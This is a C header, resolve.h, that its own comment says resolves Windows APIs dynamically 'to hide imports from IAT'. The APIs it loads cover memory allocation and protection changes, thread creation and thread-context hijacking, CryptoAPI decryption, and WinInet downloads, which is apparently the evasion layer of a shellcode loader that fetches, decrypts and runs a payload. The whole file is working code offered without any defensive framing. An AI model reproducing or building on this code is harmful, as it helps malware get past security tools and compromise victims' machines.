// resolve.h - Dynamic API resolution to hide imports from IAT
#pragma once
#include <Windows.h>
#include <wincrypt.h>
#include <wininet.h>

// ===================== KERNEL32 TYPEDEFS =====================

typedef LPVOID(WINAPI* fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* fn_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI* fn_GetCurrentThread)(void);
typedef BOOL(WINAPI* fn_DuplicateHandle)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
typedef DWORD(WINAPI* fn_SuspendThread)(HANDLE);
typedef DWORD(WINAPI* fn_ResumeThread)(HANDLE);
typedef BOOL(WINAPI* fn_GetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL(WINAPI* fn_SetThreadContext)(HANDLE, const CONTEXT*);
typedef DWORD(WINAPI* fn_WaitForSingleObject)(HANDLE, DWORD);
typedef BOOL(WINAPI* fn_CloseHandle)(HANDLE);
typedef DWORD(WINAPI* fn_SleepEx)(DWORD, BOOL);
typedef HMODULE(WINAPI* fn_LoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* fn_GetProcAddress)(HMODULE, LPCSTR);
typedef HANDLE(WINAPI* fn_GetCurrentProcess)(void);

// ===================== ADVAPI32 TYPEDEFS =====================

typedef BOOL(WINAPI* fn_CryptAcquireContextW)(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
typedef BOOL(WINAPI* fn_CryptCreateHash)(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
typedef BOOL(WINAPI* fn_CryptHashData)(HCRYPTHASH, const BYTE*, DWORD, DWORD);
typedef BOOL(WINAPI* fn_CryptDeriveKey)(HCRYPTPROV, ALG_ID, HCRYPTHASH, DWORD, HCRYPTKEY*);
typedef BOOL(WINAPI* fn_CryptDecrypt)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*);
typedef BOOL(WINAPI* fn_CryptReleaseContext)(HCRYPTPROV, DWORD);
typedef BOOL(WINAPI* fn_CryptDestroyHash)(HCRYPTHASH);
typedef BOOL(WINAPI* fn_CryptDestroyKey)(HCRYPTKEY);

// ===================== WININET TYPEDEFS =====================

typedef HINTERNET(WINAPI* fn_InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* fn_InternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* fn_InternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* fn_InternetCloseHandle)(HINTERNET);

// ===================== GLOBAL POINTERS =====================

fn_VirtualAlloc         p_VirtualAlloc;
fn_VirtualProtect       p_VirtualProtect;
fn_CreateThread         p_CreateThread;
fn_GetCurrentThread     p_GetCurrentThread;
fn_DuplicateHandle      p_DuplicateHandle;
fn_SuspendThread        p_SuspendThread;
fn_ResumeThread         p_ResumeThread;
fn_GetThreadContext     p_GetThreadContext;
fn_SetThreadContext     p_SetThreadContext;
fn_WaitForSingleObject  p_WaitForSingleObject;
fn_CloseHandle          p_CloseHandle;
fn_SleepEx              p_SleepEx;
fn_LoadLibraryA         p_LoadLibraryA;
fn_GetProcAddress       p_GetProcAddress;
fn_GetCurrentProcess    p_GetCurrentProcess;

fn_CryptAcquireContextW p_CryptAcquireContextW;
fn_CryptCreateHash      p_CryptCreateHash;
fn_CryptHashData        p_CryptHashData;
fn_CryptDeriveKey       p_CryptDeriveKey;
fn_CryptDecrypt         p_CryptDecrypt;
fn_CryptReleaseContext  p_CryptReleaseContext;
fn_CryptDestroyHash     p_CryptDestroyHash;
fn_CryptDestroyKey      p_CryptDestroyKey;

fn_InternetOpenA        p_InternetOpenA;
fn_InternetOpenUrlA     p_InternetOpenUrlA;
fn_InternetReadFile     p_InternetReadFile;
fn_InternetCloseHandle  p_InternetCloseHandle;


BOOL ResolveAPIs() {

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return FALSE;

    p_GetProcAddress = (fn_GetProcAddress)GetProcAddress(hKernel32, "GetProcAddress");
    if (!p_GetProcAddress) return FALSE;

    p_LoadLibraryA = (fn_LoadLibraryA)p_GetProcAddress(hKernel32, "LoadLibraryA");
    if (!p_LoadLibraryA) return FALSE;

    p_VirtualAlloc        = (fn_VirtualAlloc)p_GetProcAddress(hKernel32, "VirtualAlloc");
    p_VirtualProtect      = (fn_VirtualProtect)p_GetProcAddress(hKernel32, "VirtualProtect");
    p_CreateThread        = (fn_CreateThread)p_GetProcAddress(hKernel32, "CreateThread");
    p_GetCurrentThread    = (fn_GetCurrentThread)p_GetProcAddress(hKernel32, "GetCurrentThread");
    p_DuplicateHandle     = (fn_DuplicateHandle)p_GetProcAddress(hKernel32, "DuplicateHandle");
    p_SuspendThread       = (fn_SuspendThread)p_GetProcAddress(hKernel32, "SuspendThread");
    p_ResumeThread        = (fn_ResumeThread)p_GetProcAddress(hKernel32, "ResumeThread");
    p_GetThreadContext    = (fn_GetThreadContext)p_GetProcAddress(hKernel32, "GetThreadContext");
    p_SetThreadContext    = (fn_SetThreadContext)p_GetProcAddress(hKernel32, "SetThreadContext");
    p_WaitForSingleObject = (fn_WaitForSingleObject)p_GetProcAddress(hKernel32, "WaitForSingleObject");
    p_CloseHandle         = (fn_CloseHandle)p_GetProcAddress(hKernel32, "CloseHandle");
    p_SleepEx             = (fn_SleepEx)p_GetProcAddress(hKernel32, "SleepEx");
    p_GetCurrentProcess   = (fn_GetCurrentProcess)p_GetProcAddress(hKernel32, "GetCurrentProcess");

    // Advapi32
    HMODULE hAdvapi32 = p_LoadLibraryA("advapi32.dll");
    if (!hAdvapi32) return FALSE;

    p_CryptAcquireContextW = (fn_CryptAcquireContextW)p_GetProcAddress(hAdvapi32, "CryptAcquireContextW");
    p_CryptCreateHash      = (fn_CryptCreateHash)p_GetProcAddress(hAdvapi32, "CryptCreateHash");
    p_CryptHashData        = (fn_CryptHashData)p_GetProcAddress(hAdvapi32, "CryptHashData");
    p_CryptDeriveKey       = (fn_CryptDeriveKey)p_GetProcAddress(hAdvapi32, "CryptDeriveKey");
    p_CryptDecrypt         = (fn_CryptDecrypt)p_GetProcAddress(hAdvapi32, "CryptDecrypt");
    p_CryptReleaseContext  = (fn_CryptReleaseContext)p_GetProcAddress(hAdvapi32, "CryptReleaseContext");
    p_CryptDestroyHash     = (fn_CryptDestroyHash)p_GetProcAddress(hAdvapi32, "CryptDestroyHash");
    p_CryptDestroyKey      = (fn_CryptDestroyKey)p_GetProcAddress(hAdvapi32, "CryptDestroyKey");

    // WinInet
    HMODULE hWininet = p_LoadLibraryA("wininet.dll");
    if (!hWininet) return FALSE;

    p_InternetOpenA       = (fn_InternetOpenA)p_GetProcAddress(hWininet, "InternetOpenA");
    p_InternetOpenUrlA    = (fn_InternetOpenUrlA)p_GetProcAddress(hWininet, "InternetOpenUrlA");
    p_InternetReadFile    = (fn_InternetReadFile)p_GetProcAddress(hWininet, "InternetReadFile");
    p_InternetCloseHandle = (fn_InternetCloseHandle)p_GetProcAddress(hWininet, "InternetCloseHandle");

    return TRUE;
}